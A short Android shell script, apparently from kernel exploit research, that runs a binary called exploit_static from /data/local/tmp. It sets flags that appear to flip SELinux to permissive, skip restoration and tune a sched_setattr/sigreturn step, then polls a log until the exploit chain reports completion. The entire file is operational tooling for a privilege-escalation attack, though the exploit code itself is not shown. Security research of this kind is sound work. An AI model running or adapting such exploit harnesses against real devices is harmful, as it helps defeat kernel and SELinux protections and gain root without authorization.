#!/system/bin/sh
# EXPERIMENT 2: sigret SELF-FIRE (waiter fires sched_setattr on itself right
# after the plant).  Same env as run_dump.sh, plus SLIDE_SG_SELF=1 and
# WALK_TRACE=1 so the durable log keeps the C1S/W5 markers across a reset.
D=/data/local/tmp
LOG=$D/self.log
cd $D || exit 1
rm -f $LOG
( DURABLE_LOG=$LOG FLIP_PERMISSIVE=1 NO_RSCAN=1 KSU_LOADER=0 \
  SYSCTL_WALK_ATTEMPTS=1 SLIDE_SELFCONTAINED=1 SLIDE_SIGNAL_WAKE=1 \
  SLIDE_WAIT_SECS=0 SLIDE_SIGRET_BUF_BYTE=0x10 \
  SLIDE_NO_RESTORE=1 KS_MAX_TRIES=1 SLIDE_NOKILL=1 WALK_TRACE=1 \
  SLIDE_SG_SELF=1 \
  ./exploit_static > /dev/null 2>&1 & )
n=0
while [ $n -lt 45 ]; do
  grep -q 'chain complete' $LOG 2>/dev/null && break
  sleep 2; n=$((n+1))
done
echo "--- self.log tail ---"
tail -25 $LOG 2>&1
echo "--- markers ---"
grep -c 'C1S self-fired' $LOG 2>/dev/null
grep -c 'chain complete' $LOG 2>/dev/null
